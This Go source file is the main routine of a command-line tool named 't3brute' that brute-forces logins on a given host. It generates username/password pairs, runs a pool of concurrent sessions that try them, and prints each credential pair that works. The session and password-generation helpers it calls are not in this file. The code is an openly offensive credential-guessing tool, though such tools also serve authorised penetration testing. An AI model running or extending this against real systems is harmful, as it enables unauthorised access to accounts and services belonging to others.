package main

import (
	"flag"
	"fmt"
	"os"
)

func printBroken(broken <-chan login) {
	for l := range broken {
		fmt.Printf("SUCCESS: %s %s\n", l.user, l.pass)
	}
}

func main() {
	flag.Parse()
	host := flag.Arg(0)
	if host == "" {
		fmt.Fprintf(os.Stderr, "Usage: t3brute HOST\n")
		os.Exit(1)
	}
	domain := urls(host)

	sessions := make(chan maybeSession)
	broken := make(chan login)
	logins := logins(make(chan login))
	pwdOver := make(chan struct{})
	// Pool of sessions that can try passwords
	sp := newPool()
	// Utility to create a new session
	makeSession := func() {
		s := newSession(domain, sessions, logins, broken)
		sp.add(s)
		go s.run()
	}

	// Generate username/password pairs and signal when there are no more
	go func() {
		logins.generate()
		// Signal that we have no more passwords to try
		pwdOver <- struct{}{}
		close(pwdOver)
	}()
	// Print broken login pairs to stdout
	go printBroken(broken)

	// Make one session to start
	makeSession()

	var noPwd bool
	for {
		select {
		case s := <-sessions:
			if s.err != nil && s.err != errSessionOver {
				fmt.Printf("Error: %s\n", s.err)
			}
			sp.del(s.s)
			// If no more sessions are working
			if !sp.alive() {
				// If we finished the passwords to try, exit
				if noPwd {
					close(broken)
					return
				}
				// Start up some more sessions to finish.
				makeSession()
			}
		case <-pwdOver:
			// No more passwords to try, just wait for all
			// the sessions to finish their attemps.
			noPwd = true
		}
	}
}
